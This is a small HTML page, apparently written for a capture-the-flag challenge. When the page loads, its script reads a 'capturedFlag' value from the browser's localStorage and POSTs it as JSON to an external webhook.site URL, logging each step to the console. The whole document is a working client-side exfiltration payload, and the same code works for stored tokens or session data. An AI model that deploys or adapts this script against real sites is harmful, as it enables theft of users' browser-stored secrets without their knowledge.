<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Stored Flag</title>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/store_flag';

            // Retrieve the flag from localStorage
            const flag = localStorage.getItem('capturedFlag');
            if (flag) {
                console.log('Retrieved flag from localStorage:', flag);

                // Send the flag to the webhook
                console.log('Sending flag to the webhook...');
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ flag }),
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Flag sent successfully to the webhook');
                    } else {
                        console.error('Failed to send flag. Response status:', response.status);
                    }
                })
                .catch(error => {
                    console.error('Error sending flag to the webhook:', error);
                });
            } else {
                console.error('No flag found in localStorage');
            }
        });
    </script>
</head>
<body>
    <h1>Send Stored Flag</h1>
    <p>The stored flag will be sent to the webhook when the page loads. Check the console for details.</p>
</body>
</html>
